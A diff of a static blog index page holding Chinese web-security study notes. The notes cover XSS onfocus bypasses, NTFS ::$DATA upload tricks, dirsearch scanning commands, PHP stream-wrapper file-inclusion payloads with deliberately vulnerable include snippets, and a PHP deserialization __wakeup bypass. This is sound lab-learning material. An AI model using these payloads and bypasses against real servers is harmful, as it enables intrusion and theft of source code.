@@ -71,6 +71,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web/XSS/绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/XSS/%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="onfocus事件绕过"><a href="#onfocus事件绕过" class="headerlink" title="onfocus事件绕过"></a>onfocus事件绕过</h2><blockquote>
+<p>先简单介绍一下onfocus事件</p>
+<p><img src="/.com//012bdfc49a3aa8cc5ab09556c096a09d-20250425091406-03qo9je.png" alt="012bdfc49a3aa8cc5ab09556c096a09d">​  </p>
+<p>onfocus事件在元素<strong>获得焦点</strong>时触发，最常与  <strong>&lt;input&gt;</strong> 、 <strong>&lt;select&gt;</strong>  和  <strong>&lt;a&gt;</strong>  标签一起使用，以上面图片的html标签 <strong>&lt;input&gt;</strong> 为例， <strong>&lt;input&gt;</strong> 标签是有输入框的，简单来说，<strong>onfocus事件</strong>就是当<strong>输入框被点击</strong>的时候，就会触发<strong>myFunction()</strong> 函数，然后我们再配合<strong>javascript伪协议</strong>来执行javascript代码</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/XSS/%E7%BB%95%E8%BF%87/" data-id="cmawcfx9d0021cg7kfy3v340y" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>在· Windows·操作系统中，当你看到文件名后跟着”::$DATA”时，它表示文件的一个附加数据流(Alternate·DataStream，ADS)。数据流是一种用于在文件内部存储额外数据的机制。在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是Windows·NT·文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”::$DATA”来访问。<br>例如，”1.txt”是一个文件，而”1.txt:$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。<br>需要注意的是，大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口</p>
+<p>‍</p>
+<p>‍</p>
+<blockquote>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">写入方法:(命令行)<br>echo·内容·&gt;&gt;文件名:数据流名<br>type· 文件名&gt;&gt;文件名:数据流名<br>查看方法:<br>notepad·文件名:数据流名</span></p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" data-id="cmawcfx9d0024cg7k3m2pce9g" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Web/XXE（XML外部实体注入）/XXE-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" class="article-date">
@@ -126,211 +194,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" data-id="cmawal1j5001mbo7k0c7yb0fy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/工具使用/dirsearch" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>windows下要下载dirsearch包，然后用python解析使用，所以我选择用kali</p>
-<h3 id="常用参数说明"><a href="#常用参数说明" class="headerlink" title="常用参数说明"></a>常用参数说明</h3><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-u</code>​&#x2F;<code>--url</code>​</td>
-<td>指定目标URL</td>
-<td>​<code>-u http://example.com</code>​</td>
-</tr>
-<tr>
-<td>​<code>-e</code>​&#x2F;<code>--extensions</code>​</td>
-<td>指定文件扩展名</td>
-<td>​<code>-e php,html,js</code>​</td>
-</tr>
-<tr>
-<td>​<code>-w</code>​&#x2F;<code>--wordlist</code>​</td>
-<td>使用自定义字典</td>
-<td>​<code>-w /path/to/wordlist.txt</code>​</td>
-</tr>
-<tr>
-<td>​<code>-r</code>​&#x2F;<code>--recursive</code>​</td>
-<td>递归扫描</td>
-<td>​<code>-r</code>​</td>
-</tr>
-<tr>
-<td>​<code>--threads</code>​</td>
-<td>设置线程数</td>
-<td>​<code>--threads 50</code>​</td>
-</tr>
-<tr>
-<td>​<code>--timeout</code>​</td>
-<td>设置超时时间</td>
-<td>​<code>--timeout 5</code>​</td>
-</tr>
-<tr>
-<td>​<code>--random-agent</code>​</td>
-<td>使用随机User-Agent</td>
-<td>​<code>--random-agent</code>​</td>
-</tr>
-<tr>
-<td>​<code>--proxy</code>​</td>
-<td>使用代理</td>
-<td>​<code>--proxy http://127.0.0.1:8080</code>​</td>
-</tr>
-</tbody></table>
-<p>‍</p>
-<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 id="1-使用扩展名过滤"><a href="#1-使用扩展名过滤" class="headerlink" title="1. 使用扩展名过滤"></a>1. 使用扩展名过滤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -e php,html,js</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-使用自定义字典"><a href="#2-使用自定义字典" class="headerlink" title="2. 使用自定义字典"></a>2. 使用自定义字典</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -w /path/to/custom_wordlist.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-递归扫描"><a href="#3-递归扫描" class="headerlink" title="3. 递归扫描"></a>3. 递归扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -r</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-排除特定状态码"><a href="#4-排除特定状态码" class="headerlink" title="4. 排除特定状态码"></a>4. 排除特定状态码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com --exclude-status 403,404</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-保存扫描结果"><a href="#5-保存扫描结果" class="headerlink" title="5. 保存扫描结果"></a>5. 保存扫描结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -o /path/to/report.txt</span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><ol>
-<li><strong>降低扫描速度</strong>：添加 <code>--delay=1</code>​ 参数，设置每次请求间隔1秒</li>
-<li><strong>只显示特定状态码</strong>：使用 <code>--status-codes 200,301,302</code>​</li>
-<li><strong>强制扫描</strong>：使用 <code>--force</code>​ 参数，即使目标返回403也继续扫描</li>
-<li><strong>HTTP方法</strong>：使用 <code>-m GET,POST</code>​ 指定HTTP方法</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/" data-id="cmawal1j5001nbo7kew966x4d" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>在· Windows·操作系统中，当你看到文件名后跟着”::$DATA”时，它表示文件的一个附加数据流(Alternate·DataStream，ADS)。数据流是一种用于在文件内部存储额外数据的机制。在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是Windows·NT·文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”::$DATA”来访问。<br>例如，”1.txt”是一个文件，而”1.txt:$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。<br>需要注意的是，大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口</p>
-<p>‍</p>
-<p>‍</p>
-<blockquote>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">写入方法:(命令行)<br>echo·内容·&gt;&gt;文件名:数据流名<br>type· 文件名&gt;&gt;文件名:数据流名<br>查看方法:<br>notepad·文件名:数据流名</span></p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" data-id="cmawal1j6001obo7kg4r30tcm" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件包含/PHP伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h1 id="一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客"><a href="#一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客" class="headerlink" title="一、前言【文件包含中的伪协议】_文件包含伪协议-CSDN博客"></a>一、前言<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45131319/article/details/138420946?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=1">【文件包含中的伪协议】_文件包含伪协议-CSDN博客</a></h1><h2 id="1-什么是PHP伪协议？"><a href="#1-什么是PHP伪协议？" class="headerlink" title="1.什么是PHP伪协议？"></a>1.什么是PHP伪协议？</h2><p>PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。</p>
-<p>有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。</p>
-<p>allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件<br>allow_url_include On&#x2F;Off 允许或禁止引用URL文件</p>
-<p>‍</p>
-<h2 id="2-什么时候用PHP伪协议"><a href="#2-什么时候用PHP伪协议" class="headerlink" title="2.什么时候用PHP伪协议?"></a>2.什么时候用PHP伪协议?</h2><p>文件包含！！！的时候，可能遇到的文件包含函数：<br>1、include<br>2、require<br>3、include_once<br>4、require_once<br>5、highlight_file<br>6、show_source<br>7、flie<br>8、readfile<br>9、file_get_contents<br>10、file_put_contents<br>11、fopen (比较常见)</p>
-<p>‍</p>
-<h1 id="二、常见的php伪协议"><a href="#二、常见的php伪协议" class="headerlink" title="二、常见的php伪协议"></a>二、常见的php伪协议</h1><p>php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流，获取POST请求数据的协议</p>
-<p>当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p>
-<p>php:&#x2F;&#x2F;input 伪协议 成功执行前提<br>php.ini 中的 allow_url_include设置为On</p>
-<p>格式示例：  </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">include</span>($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>php:&#x2F;&#x2F;filter<br>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
-<p>在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出</p>
-<p>php:&#x2F;&#x2F;filter 的使用：<br>如<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php</p>
-<p>php:&#x2F;&#x2F;filter 伪协议组成：<br>read&#x3D;&lt;读链的筛选列表&gt;<br>resource&#x3D;&lt;要过滤的数据流&gt;<br>write&#x3D;&lt;写链的筛选列表&gt;<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件</p>
-<p>read 对应要设置的过滤器：<br>常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器<br>其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器</p>
-<p>格式示例：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">echo</span>(<span class="built_in">file_get_contents</span>($a));<span class="comment">//获取文件内容</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
-<p>格式示例：  </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议<br>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
-<p>格式示例：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>压缩及协议访问格式：</p>
-<p>压缩文件为.zip后缀<br>zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php<br>压缩文件为.bz2后缀<br>compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php<br>压缩文件为.gz后缀<br>compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php</p>
-<p>data:&#x2F;&#x2F;<br>data:&#x2F;&#x2F;伪协议可以通过请求提交的php代码数据配合文件包含函数可以达到代码执行效果。</p>
-<p>data:&#x2F;&#x2F;伪协议 成功执行前提<br>php.ini设置allow_url_include 与allow_url_open都为On。</p>
-<p>data:&#x2F;&#x2F;协议的格式是: data:&#x2F;&#x2F;数据流封装器,相应格式数据</p>
-<p>格式示例：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="built_in">include</span>($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>phar:&#x2F;&#x2F;伪协议可以对zip格式压缩包进行访问解析</p>
-<p>格式示例：</p>
-<blockquote>
-<p>phar:&#x2F;&#x2F;绝对路径\phpinfo.zip\phpinfo.php</p>
-</blockquote>
-<p>注意这里与zip:&#x2F;&#x2F;不同的地方是，phar访问压缩包内容是通过&#x2F;访问，而zip是通过#访问</p>
-<blockquote>
-<p>使用这些伪协议时，需要注意PHP配置和服务器环境的限制，某些协议可能因为配置或安全原因被禁用。<br>特别是在处理外部资源（如HTTP或FTP）时，需要注意安全性，确保不会暴露敏感信息或遭受注入攻击。<br>在使用 data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等伪协议时，应特别注意数据的验证和清洁，以避免安全漏洞。</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cmawal1j6001pbo7k5z61g1bz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" data-id="cmawcfx9d0027cg7kbndv2nmo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -411,7 +275,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" data-id="cmawal1j7001sbo7k65q5eyi4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" data-id="cmawcfx9e002acg7kh7360bq1" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -423,9 +287,9 @@
 
 
   
-    <article id="post-Web/注入漏洞/反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/文件包含/PHP伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -435,37 +299,56 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com"><a href="#魔法方法php反序列化知识点总结-Th0r-博客园-cnblogs-com" class="headerlink" title="魔法方法php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)"></a>魔法方法<a target="_blank" rel="noopener" href="https://www.cnblogs.com/th0r/p/14071894.html#0x02-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95">php反序列化知识点总结 - Th0r - 博客园 (cnblogs.com)</a></h2><p>魔法方法指的是在php执行某个过程或函数时会调用的方法</p>
-<p>​<code>__construct()</code>​：在创建对象时候初始化对象，一般用于对变量赋初值（实例化对象时）。</p>
-<p>​<code>__destruct()</code>​： 和构造函数相反，当对象所在函数调用完毕后执行。（对象引用完成或对象被销毁反序列化之后）</p>
-<p>​<code>__toString()</code>​：当对象被当做一个字符串使用时调用。</p>
-<p>​<code>__invoke()</code>​：把对象当成函数调用</p>
-<p>​<code>__clone</code>​：当使用clone关键字拷贝完成一个对象</p>
-<p>​<code>__sleep()</code>​：序列化对象之前就调用此方法(其返回需要一个数组（序列化unserilize（）之前）</p>
-<p>​<code>__wakeup()</code>​：反序列化恢复对象之前调用该方法（反序列化unserilize（）之前）</p>
-<p>​<code>__call()</code>​：当调用对象中不存在的方法会自动调用该方法。  __callStatic():静态调用或调用成员常量时使用的方法不存在</p>
-<p>​<code>__get()</code>​：在调用私有属性（不存在）的时候会自动执行</p>
-<p>​<code>__set()</code>​：给不存在的成员属性赋值</p>
-<p>​<code>__isset()</code>​：在不可访问的属性上调用isset()或empty()触发</p>
-<p>​<code>__unset()</code>​：在不可访问的属性上使用unset()时触发</p>
-<h3 id="绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com"><a href="#绕过-wakeup​PHP-反序列化基础完全解析-先知社区-aliyun-com" class="headerlink" title="绕过 __wakeup​PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)"></a>绕过 <code>__wakeup</code>​<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14667?time__1311=mqmx9QDtDQ0QD=oDsdoYK0=9bkOQ=DcD3D&alichlgref=https://www.bing.com/">PHP 反序列化基础完全解析 - 先知社区 (aliyun.com)</a></h3><p>当反序列化时, 给出的字段个数的数字小于提供的字段个数, 将不会执行 <code>__wakeup</code>​</p>
-<p>例如:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:1:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+        <h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h1 id="一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客"><a href="#一、前言【文件包含中的伪协议】-文件包含伪协议-CSDN博客" class="headerlink" title="一、前言【文件包含中的伪协议】_文件包含伪协议-CSDN博客"></a>一、前言<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45131319/article/details/138420946?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~baidujs_baidulandingword~Ctr-1-138420946-blog-136493198.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=1">【文件包含中的伪协议】_文件包含伪协议-CSDN博客</a></h1><h2 id="1-什么是PHP伪协议？"><a href="#1-什么是PHP伪协议？" class="headerlink" title="1.什么是PHP伪协议？"></a>1.什么是PHP伪协议？</h2><p>PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。</p>
+<p>有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。</p>
+<p>allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件<br>allow_url_include On&#x2F;Off 允许或禁止引用URL文件</p>
+<p>‍</p>
+<h2 id="2-什么时候用PHP伪协议"><a href="#2-什么时候用PHP伪协议" class="headerlink" title="2.什么时候用PHP伪协议?"></a>2.什么时候用PHP伪协议?</h2><p>文件包含！！！的时候，可能遇到的文件包含函数：<br>1、include<br>2、require<br>3、include_once<br>4、require_once<br>5、highlight_file<br>6、show_source<br>7、flie<br>8、readfile<br>9、file_get_contents<br>10、file_put_contents<br>11、fopen (比较常见)</p>
+<p>‍</p>
+<h1 id="二、常见的php伪协议"><a href="#二、常见的php伪协议" class="headerlink" title="二、常见的php伪协议"></a>二、常见的php伪协议</h1><p>php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流，获取POST请求数据的协议</p>
+<p>当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p>
+<p>php:&#x2F;&#x2F;input 伪协议 成功执行前提<br>php.ini 中的 allow_url_include设置为On</p>
+<p>格式示例：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">include</span>($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>改为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Dino&quot;:114514:&#123;s:4:&quot;addr&quot;;s:3:&quot;209&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>php:&#x2F;&#x2F;filter<br>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出</p>
+<p>php:&#x2F;&#x2F;filter 的使用：<br>如<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php</p>
+<p>php:&#x2F;&#x2F;filter 伪协议组成：<br>read&#x3D;&lt;读链的筛选列表&gt;<br>resource&#x3D;&lt;要过滤的数据流&gt;<br>write&#x3D;&lt;写链的筛选列表&gt;<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件</p>
+<p>read 对应要设置的过滤器：<br>常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器<br>其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器</p>
+<p>格式示例：</p>
